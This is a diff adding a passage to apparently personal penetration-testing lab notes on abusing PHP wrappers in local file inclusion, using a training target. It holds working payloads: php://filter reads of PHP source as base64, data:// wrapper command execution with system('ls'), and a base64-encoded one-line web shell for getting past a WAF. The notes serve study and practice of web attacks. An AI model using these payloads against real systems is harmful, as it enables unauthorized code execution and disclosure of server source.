@@ -1126,3 +1126,60 @@ Apache logs: `C:\xampp\apache\logs\`
 > 1. LFI vulnerability in a `JSP web application`
 > 2. LFI vulnerabilities in modern back-end JavaScript runtime environments like `Node.js`.
 
+### 2. PHP Wrappers
+#### **php://filter**
+Display the contents of files either with or without encodings like ROT13 or Base64.
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+...
+```
+>[!Note]
+> `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing.
+#### **data://**
+Use the data:// wrapper to achieve code execution.This wrapper is used to embed data elements as **plaintext** or **base64-encoded** data in the running web application's code. 
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+```
+> add data:// followed by the data type and content.
+
+Bypass WAF, we can try to use the data:// wrapper with base64-encoded data.
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
+> (Base64 decode) PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+> <?php echo system($_GET["cmd"]);?>
+
+>[!Tip]
+> `data://` wrapper will not work in a default PHP installation. To exploit it, the **[allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)** setting needs to be `enabled`.
+
